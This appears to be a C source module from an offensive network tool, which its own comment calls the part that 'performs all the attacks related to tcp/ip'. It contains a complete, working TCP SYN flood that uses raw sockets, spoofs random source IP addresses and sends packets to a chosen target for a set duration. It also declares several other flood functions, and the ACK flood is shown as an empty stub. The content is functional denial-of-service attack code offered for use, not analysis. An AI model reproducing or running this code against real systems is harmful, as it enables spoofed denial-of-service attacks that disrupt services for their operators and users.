/* This module is used by the software to perform all the attacks related to tcp/ip */
#include <stdio.h> /* logging */
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <time.h>
#include <unistd.h>
#include <netinet/in.h>  /* For in_addr */
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ip.h>

#include "tung.h"
#include "logs.h"
#include "utils.h"

/* Ethernet header */
struct ethheader {
    	uint8_t  ether_dhost[6]; /* Destination host address */
    	uint8_t  ether_shost[6]; /* Source host address */
    	uint16_t ether_type;      /* IP? ARP? RARP? etc */
};

/* IP Header */
struct ipheader {
    	uint8_t  iph_ihl:4,      /* IP header length */
		 iph_ver:4;       /* IP version */
    	uint8_t  iph_tos;        /* Type of service */
    	uint16_t iph_len;        /* IP Packet length (data + header) */
    	uint16_t iph_ident;      /* Identification */
    	uint16_t iph_flag:3,     /* Fragmentation flags */
		 iph_offset:13;   /* Flags offset */
    	uint8_t  iph_ttl;        /* Time to Live */
    	uint8_t  iph_protocol;   /* Protocol type */
    	uint16_t iph_chksum;     /* IP datagram checksum */
    	struct in_addr iph_sourceip;  /* Source IP address */
    	struct in_addr iph_destip;    /* Destination IP address */
};

/* ICMP Header */
struct icmpheader {
    	uint8_t  icmp_type;      /* ICMP message type */
    	uint8_t  icmp_code;      /* Error code */
    	uint16_t icmp_chksum;    /* Checksum for ICMP Header and data */
    	uint16_t icmp_id;        /* Used for identifying request */
    	uint16_t icmp_seq;       /* Sequence number */
};

/* UDP Header */
struct udpheader {
    	uint16_t udp_sport;      /* Source port */
    	uint16_t udp_dport;      /* Destination port */
    	uint16_t udp_ulen;       /* UDP length */
    	uint16_t udp_sum;        /* UDP checksum */
};

/* TCP Header */
struct tcpheader {
	uint16_t tcp_sport;      /* Source port */
   	uint16_t tcp_dport;      /* Destination port */
    	uint32_t tcp_seq;        /* Sequence number */
    	uint32_t tcp_ack;        /* Acknowledgement number */
    	uint8_t  tcp_offx2;      /* Data offset, rsvd */
#define TH_OFF(th) (((th)->tcp_offx2 & 0xf0) >> 4)
    	uint8_t  tcp_flags;
#define TH_FIN  0x01
#define TH_SYN  0x02
#define TH_RST  0x04
#define TH_PUSH 0x08
#define TH_ACK  0x10
#define TH_URG  0x20
#define TH_ECE  0x40
#define TH_CWR  0x80
#define TH_FLAGS (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
    	uint16_t tcp_win;        /* Window */
    	uint16_t tcp_sum;        /* Checksum */
    	uint16_t tcp_urp;        /* Urgent pointer */
};

/* Pseudo TCP header */
struct pseudo_tcp {
    	uint32_t saddr, daddr;
    	uint8_t  mbz;
    	uint8_t  ptcl;
    	uint16_t tcpl;
    	struct tcpheader tcp;
    	uint8_t  payload[1500];
};

#define PACKET_LEN 1024

/* Internal Helpers */
static int create_tcp_socket();
static struct sockaddr_in build_tcp_target(struct ipheader *ip);
static int should_continue(time_t start, uint16_t duration);
uint16_t calculate_tcp_checksum(struct ipheader *ip);
uint16_t checksum(uint16_t *addr, int len);

/* flood prototypes */
void syn_flood(struct attack_opts_t *opts);
void ack_flood(struct attack_opts_t *opts);
void rst_flood(struct attack_opts_t *opts);
void fin_flood(struct attack_opts_t *opts);
void psh_ack_flood(struct attack_opts_t *opts);
void xmas_flood(struct attack_opts_t *opts);
void null_flood(struct attack_opts_t *opts);

static int create_tcp_socket() {
	int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	int enable = 1;

	if(sockfd < 0) {
		LOG_ERROR("Error: Failed to initialize socket");
		perror("socket");
		exit(EXIT_FAILURE);
	}

	setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));
	
	return sockfd;
}

static struct sockaddr_in build_tcp_target(struct ipheader *ip) {
	struct sockaddr_in dest_info;
	memset(&dest_info, 0, sizeof(dest_info));
	
	dest_info.sin_family = AF_INET;
    	dest_info.sin_addr = ip->iph_destip;

	return dest_info;
}

int should_continue(time_t start, uint16_t duration) {
	return (time(NULL) - start) < duration;
}

/* Calculate TCP checksum given the IP header */
uint16_t calculate_tcp_checksum(struct ipheader *ip) {
    	struct tcpheader *tcp = (struct tcpheader *)((uint8_t *)ip + (ip->iph_ihl * 4));
	
	if (ntohs(ip->iph_len) <= (ip->iph_ihl * 4)) { /* check underflow */
    		return 0;  
	}

	uint16_t tcp_len = ntohs(ip->iph_len) - (ip->iph_ihl * 4);

    	/* Pseudo header for checksum calculation */
    	struct pseudo_tcp pheader;
    	memset(&pheader, 0, sizeof(pheader));

    	pheader.saddr = ip->iph_sourceip.s_addr;
    	pheader.daddr = ip->iph_destip.s_addr;
    	pheader.mbz = 0;
    	pheader.ptcl = IPPROTO_TCP;
    	pheader.tcpl = htons(tcp_len);

    	/* Copy TCP header and data */
    	memcpy(&pheader.tcp, tcp, tcp_len);

    	/* Zero out checksum field in TCP header */
    	pheader.tcp.tcp_sum = 0;

    	return checksum((uint16_t *)&pheader, sizeof(pheader.saddr) + sizeof(pheader.daddr) +
			sizeof(pheader.mbz) + sizeof(pheader.ptcl) + sizeof(pheader.tcpl) + tcp_len);
}

uint16_t checksum(uint16_t *addr, int len) {
    	uint32_t sum = 0;

    	/* Sum all 16-bit words */
    	while(len > 1) {
        	sum += *addr++;
        	len -= 2;
    	}

    	/* Add left-over byte, if any */
    	if(len > 0) {
        	sum += *(uint8_t *)addr;
    	}

    	/* Fold 32-bit sum to 16 bits */
    	while(sum >> 16) {
        	sum = (sum & 0xFFFF) + (sum >> 16);
    	}

    	return (uint16_t)~sum;
}

void syn_flood(struct attack_opts_t *opts) {

	check_root();	
	LOG_INFO("Started TCP SYN Flood attack to %s for %d seconds %s", 
			opts->atk_target, opts->atk_duration, opt_verboose ? "(no replies will be shown)" : "");

	printf(COLOR_YELLOW "▸ Target:" COLOR_RESET " %s\n", opts->atk_target);
    	printf(COLOR_YELLOW "▸ Port:" COLOR_RESET " %s\n", opts->atk_port);
    	printf(COLOR_YELLOW "▸ Duration:" COLOR_RESET " %d seconds\n\n", opts->atk_duration);

	/* SYN Flood TCP header */
	char buffer[PACKET_LEN];
	register uint64_t packets_count = 0;
	int sock = create_tcp_socket();
    	struct ipheader *ip = (struct ipheader *)buffer;
    	struct tcpheader *tcp = (struct tcpheader *)(buffer + sizeof(struct ipheader));
	struct sockaddr_in dest_info = build_tcp_target(ip);

	srand(time(0));
	time_t start = time(NULL);

	while(should_continue(start, opts->atk_duration)) {
		memset(buffer, 0, PACKET_LEN);
        	
		tcp->tcp_sport = rand(); 			/* Use random source port */
        	tcp->tcp_dport = htons(atoi(opts->atk_port));
        	tcp->tcp_seq = rand(); 				/* Use random sequence # */
        	tcp->tcp_offx2 = 0x50;
        	tcp->tcp_flags = TH_SYN; 			/* Enable the SYN bit */
        	tcp->tcp_win = htons(20000);
        	tcp->tcp_sum = 0;

        	ip->iph_ver = 4;					/* Version (IPV4) */
        	ip->iph_ihl = 5;					/* Header length */
        	ip->iph_ttl = 50;					/* Time to live */
        	ip->iph_sourceip.s_addr = rand() ^ (rand() << 15) ^ (rand() << 30); /* Use a random IP address */
        	ip->iph_destip.s_addr = inet_addr(opts->atk_target);
       		ip->iph_protocol = IPPROTO_TCP; 	/* The value is 6. */
	        ip->iph_len = htons(sizeof(struct ipheader) + sizeof(struct tcpheader));

		tcp->tcp_sum = calculate_tcp_checksum(ip);

		if(opt_verboose) {
			printf(COLOR_YELLOW "▸ Source IP:    " COLOR_BLUE "%-15s" COLOR_RESET, inet_ntoa(ip->iph_sourceip));
    			printf(COLOR_YELLOW "  ▸ Source Port: " COLOR_BLUE "%d\n" COLOR_RESET, ntohs(tcp->tcp_sport));
    
    			printf(COLOR_YELLOW "▸ Dest IP:      " COLOR_BLUE "%-15s" COLOR_RESET, opts->atk_target);
   			printf(COLOR_YELLOW "  ▸ Dest Port:   " COLOR_BLUE "%s\n" COLOR_RESET, opts->atk_port);
    
    			printf(COLOR_YELLOW "▸ Sequence:     " COLOR_BLUE "0x%08x" COLOR_RESET, ntohl(tcp->tcp_seq));
    			printf(COLOR_YELLOW "  ▸ Window Size: " COLOR_BLUE "%d\n" COLOR_RESET, ntohs(tcp->tcp_win));
    
    			printf(COLOR_YELLOW "▸ IP Header:    " COLOR_BLUE "Version=%d" COLOR_RESET, ip->iph_ver);
    			printf(COLOR_YELLOW ", IHL=%d" COLOR_RESET, ip->iph_ihl);
    			printf(COLOR_YELLOW ", TTL=%d" COLOR_RESET, ip->iph_ttl);
    			printf(COLOR_YELLOW ", Protocol=TCP (%d)\n" COLOR_RESET, ip->iph_protocol);
    
    			printf(COLOR_YELLOW "▸ TCP Flags:    " COLOR_RESET);
    			printf(COLOR_BLUE "%s%s%s%s%s%s\n" COLOR_RESET,
           			(tcp->tcp_flags & TH_SYN) ? "SYN " : "",
           			(tcp->tcp_flags & TH_ACK) ? "ACK " : "",
           			(tcp->tcp_flags & TH_FIN) ? "FIN " : "",
           			(tcp->tcp_flags & TH_RST) ? "RST " : "",
           			(tcp->tcp_flags & TH_PUSH) ? "PSH " : "",
           			(tcp->tcp_flags & TH_URG) ? "URG " : "");
    
    			printf(COLOR_YELLOW "▸ Checksum:     " COLOR_BLUE "0x%04x" COLOR_RESET, ntohs(tcp->tcp_sum));
    			printf(COLOR_YELLOW "  ▸ Packet Size: " COLOR_BLUE "%d bytes\n\n" COLOR_RESET, ntohs(ip->iph_len));
    
    			printf(COLOR_CYAN "[•] Packet #%-6lu " COLOR_YELLOW "Timestamp: " COLOR_BLUE "%.2fs\n" COLOR_RESET,
					packets_count, difftime(time(NULL), start));
		}
		
		/* send the packet out */
		if (sendto(sock, ip, ntohs(ip->iph_len), 0, (struct sockaddr *)&dest_info, sizeof(dest_info)) < 0) {
 			perror("sendto failed");
    			break;
		}

		packets_count++;
	}
	
	LOG_INFO("TCP SYN Flood ended (packets sent: %lu)", packets_count);
	close(sock);
}

void ack_flood(struct attack_opts_t *opts) {
	(void)opts;	
}
